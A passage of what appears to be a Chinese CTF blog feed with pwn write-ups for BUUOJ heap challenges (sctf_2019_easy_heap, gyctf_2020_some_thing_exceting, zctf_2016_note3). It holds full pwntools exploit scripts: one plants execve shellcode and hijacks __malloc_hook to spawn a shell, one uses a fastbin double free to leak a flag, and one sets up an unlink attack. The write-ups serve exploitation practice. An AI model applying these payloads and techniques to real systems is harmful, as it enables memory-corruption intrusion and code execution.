title="最后，再malloc一次，就会执行malloc_hook,而这个地址就会去执行mmap+0x10这个地址，这个地址放又shellcode，成功提权。"></a>最后，再malloc一次，就会执行malloc_hook,而这个地址就会去执行mmap+0x10这个地址，这个地址放又shellcode，成功提权。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"node4.buuoj.cn"</span>,<span class="number">29573</span>)</span><br><span class="line"><span class="comment">#p=process("./sctf_2019_easy_heap")</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: '</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index: '</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index: '</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Mmap: '</span>)</span><br><span class="line">mmap_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(mmap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>) </span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x420</span>+<span class="number">0x20</span>+<span class="number">0x30</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">0x410</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(mmap_addr+<span class="number">0x10</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">fill(<span class="number">1</span>,<span class="string">'\x30'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">5</span>,payload2)</span><br><span class="line">fill(<span class="number">6</span>,p64(mmap_addr + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="//posts/0/"/>
      <url>//posts/0/</url>
      
        <content type="html"><![CDATA[<h1 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h1><h4 id="有点奇怪的UAF题，double-free-有点奇怪"><a href="#有点奇怪的UAF题，double-free-有点奇怪" class="headerlink" title="有点奇怪的UAF题，double free 有点奇怪"></a>有点奇怪的UAF题，double free 有点奇怪</h4><h4 id="做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来"><a href="#做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来" class="headerlink" title="做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来"></a>做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来</h4><p><img src="https://i.imgs.ovh/2023/10/16/rORK5.png" alt="image-20231016195506227"></p><h4 id="flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8"><a href="#flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8" class="headerlink" title="flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8"></a>flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOQlA.png" alt="image-20231016195328962"></p><h4 id="除了没有edit函数，其他都有"><a href="#除了没有edit函数，其他都有" class="headerlink" title="除了没有edit函数，其他都有"></a>除了没有edit函数，其他都有</h4><h4 id="add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。"><a href="#add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。" class="headerlink" title="add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。"></a>add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOuOD.png" alt="image-20231016194828854"></p><h4 id="show函数，将两个地址的内容都打印出来，后期是用来打印flag"><a href="#show函数，将两个地址的内容都打印出来，后期是用来打印flag" class="headerlink" title="show函数，将两个地址的内容都打印出来，后期是用来打印flag"></a>show函数，将两个地址的内容都打印出来，后期是用来打印flag</h4><p><img src="https://i.imgs.ovh/2023/10/16/rO7Eo.png" alt="image-20231016195158667"></p><h4 id="dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double-free"><a href="#dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double-free" class="headerlink" title="dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free"></a>dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOt0U.png" alt="image-20231016195828924"></p><h4 id="漏洞是利用double-free-先单独free同一个两次堆不行，得先创建两次"><a href="#漏洞是利用double-free-先单独free同一个两次堆不行，得先创建两次" class="headerlink" title="漏洞是利用double free ,先单独free同一个两次堆不行，得先创建两次"></a>漏洞是利用double free ,先单独free同一个两次堆不行，得先创建两次</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bss=<span class="number">0x6020a8</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'MMMM'</span>,<span class="number">0x50</span>,<span class="string">'NNNN'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'AAAA'</span>,<span class="number">0x40</span>,<span class="string">'BBBB'</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/16/ruHnp.png" alt="image-20231016161307844"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruMbT.png" alt="image-20231016161325105"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><h4 id="这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零"><a href="#这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零" class="headerlink" title="这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零"></a>这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零</h4><p><img src="https://i.imgs.ovh/2023/10/16/rup5u.png" alt="image-20231016161832970"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruuyO.png" alt="image-20231016162207401"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>) <span class="comment">#double free</span></span><br></pre></td></tr></tbody></table></figure><h4 id="这里的话是double-free-，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等"><a href="#这里的话是double-free-，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等" class="headerlink" title="这里的话是double free ，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等"></a>这里的话是double free ，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等</h4><p><img src="https://i.imgs.ovh/2023/10/16/ru4mt.png" alt="image-20231016163943852"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruzIU.png" alt="image-20231016162508547"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x40,p64(bss),0x40,'AAAA')</span><br></pre></td></tr></tbody></table></figure><h4 id="再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址"><a href="#再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址" class="headerlink" title="再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址"></a>再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址</h4><p><img src="https://i.imgs.ovh/2023/10/16/rujCC.png" alt="image-20231016163754041"></p><p><img src="https://i.imgs.ovh/2023/10/16/ru5cm.png" alt="image-20231016164225408"></p><h4 id="再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址"><a href="#再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址" class="headerlink" title="再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址"></a>再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,<span class="string">'MMMM'</span>,<span class="number">0x40</span>,<span class="string">'kkkk'</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/16/ruv62.png" alt="image-20231016164831150"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruycj.png" alt="image-20231016164848340"></p><h4 id="再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc-0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。"><a href="#再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc-0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。" class="headerlink" title="再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc 0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。"></a>再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc 0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure><h4 id="想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。"><a href="#想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。" class="headerlink" title="想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。"></a>想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。</h4><p><img src="https://i.imgs.ovh/2023/10/16/r7XdW.png" alt="image-20231016170214324"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",26884)</span></span><br><span class="line">p=process(<span class="string">"./gyctf_2020_some_thing_exceting"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./gyctf_2020_some_thing_exceting'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size1,content1,size2,content2</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Now please tell me what you want to do :'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; ba's length : "</span>,<span class="built_in">str</span>(size1))</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; ba : '</span>,content1)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; na's length : "</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; na : '</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Now please tell me what you want to do :'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Banana ID :'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Now please tell me what you want to do :'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; Banana ID : &gt; SCP project ID : '</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x6020a8</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'MMMM'</span>,<span class="number">0x50</span>,<span class="string">'NNNN'</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'AAAA'</span>,<span class="number">0x50</span>,<span class="string">'BBBB'</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(bss),<span class="number">0x50</span>,<span class="string">'AAAA'</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'MMMM'</span>,<span class="number">0x50</span>,<span class="string">'kkkk'</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b'1'</span>,<span class="number">0x60</span>,<span class="string">b''</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#dele(0)</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="//posts/0/"/>
      <url>//posts/0/</url>
      
        <content type="html"><![CDATA[<h1 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h1><h4 id="这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。"><a href="#这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。" class="headerlink" title="这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。"></a>这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。</h4><h4 id="先看add函数"><a href="#先看add函数" class="headerlink" title="先看add函数"></a>先看add函数</h4><p><img src="https://i.imgs.ovh/2023/10/14/rAZ7T.png" alt="image-20231014214742855"></p><h4 id="第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub-4008dd的函数，再点进去"><a href="#第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub-4008dd的函数，再点进去" class="headerlink" title="第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub_4008dd的函数，再点进去"></a>第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub_4008dd的函数，再点进去</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFTgo.png" alt="image-20231012210324374"></p><h4 id="sub-4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数-char-a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’-x00’时结束，这里的a3-10其实就是截止符’-xa’，后面两条已经不重要了。"><a href="#sub-4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数-char-a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’-x00’时结束，这里的a3-10其实就是截止符’-xa’，后面两条已经不重要了。" class="headerlink" title="sub_4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数 char a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’\x00’时结束，这里的a3=10其实就是截止符’\xa’，后面两条已经不重要了。"></a>sub_4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数 char a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’\x00’时结束，这里的a3=10其实就是截止符’\xa’，后面两条已经不重要了。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFEWD.png" alt="image-20231012210438919"></p><h4 id="最后返回的是我们输入的第十二行size的值。第十九行的sub-4008dd函数也是同理，不过输入的长度有size决定。外面的sub-400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size"><a href="#最后返回的是我们输入的第十二行size的值。第十九行的sub-4008dd函数也是同理，不过输入的长度有size决定。外面的sub-400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size" class="headerlink" title="最后返回的是我们输入的第十二行size的值。第十九行的sub_4008dd函数也是同理，不过输入的长度有size决定。外面的sub_400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size"></a>最后返回的是我们输入的第十二行size的值。第十九行的sub_4008dd函数也是同理，不过输入的长度有size决定。外面的sub_400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFqNA.png" alt="image-20231012211843683"></p><h4 id="edit函数，先看第16行的read函数，第一个参数-amp-ptr-v3-其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。"><a href="#edit函数，先看第16行的read函数，第一个参数-amp-ptr-v3-其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。" class="headerlink" title="edit函数，先看第16行的read函数，第一个参数 *(&amp;ptr + v3)其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。"></a>edit函数，先看第16行的read函数，第一个参数 *(&amp;ptr + v3)其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFGp5.png" alt="image-20231012212200515"></p><h4 id="dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞"><a href="#dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞" class="headerlink" title="dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞"></a>dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFN7s.png" alt="image-20231012212926978"></p><h4 id="重点的地方在这，就是unlink的怎么构造。"><a href="#重点的地方在这，就是unlink的怎么构造。" class="headerlink" title="重点的地方在这，就是unlink的怎么构造。"></a>重点的地方在这，就是unlink的怎么构造。</h4><h4 id="先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd-ptr-0x18和bk-ptr-0x10，后期会进行和并"><a href="#先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd-ptr-0x18和bk-ptr-0x10，后期会进行和并" class="headerlink" title="先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd=ptr-0x18和bk=ptr-0x10，后期会进行和并"></a>先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd=ptr-0x18和bk=ptr-0x10，后期会进行和并</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ptr=<span class="number">0x6020c8</span></span><br><span class="line">fd=ptr-<span class="number">0x18</span></span><br><span class="line">bk=ptr-<span class="number">0x10</span></span><br><span class="line">payload1=p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)+p64(fd)+p64(bk)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,payload1) <span class="comment">#堆0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'bbbb'</span>)      <span class="comment">#堆1</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'CCCC'</span>)   <span class="comment">#堆2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'dddd'</span>)   <span class="comment">#堆3 </span></span><br><span class="line">dele(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><h4 id="关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10-后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2"><a href="#关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10-后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2" class="headerlink" title="关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10,后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2"></a>关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10,后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2=p64(0)*2+p64(0xb0)+p64(0xa0)</span><br><span class="line"></span><br><span class="line">add(0,payload2)</span><br></pre></td></tr></tbody></table></figure><h4 id="覆盖后的堆块是长这样的，把第堆2的大小和它的previous-in-use位改成了0-也就是上一个堆堆1没有使用"><a href="#覆盖后的堆块是长这样的，把第堆2的大小和它的previous-in-use位改成了0-也就是上一个堆堆1没有使用" class="headerlink" title="覆盖后的堆块是长这样的，把第堆2的大小和它的previous in use位改成了0,也就是上一个堆堆1没有使用"></a>覆盖后的堆块是长这样的，把第堆2的大小和它的previous in use位改成了0,也就是上一个堆堆1没有使用</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFaDX.png" alt="image-20231014153740961.png"></p><h4 id="当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous-size-0xbbb0c8这里表示上一个堆没有使用。"><a href="#当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous-size-0xbbb0c8这里表示上一个堆没有使用。" class="headerlink" title="当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous size ,0xbbb0c8这里表示上一个堆没有使用。"></a>当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous size ,0xbbb0c8这里表示上一个堆没有使用。</h4><p><img src="zctf_2016_note3.assets/AJTB31Sv6tYn9Vu.png" 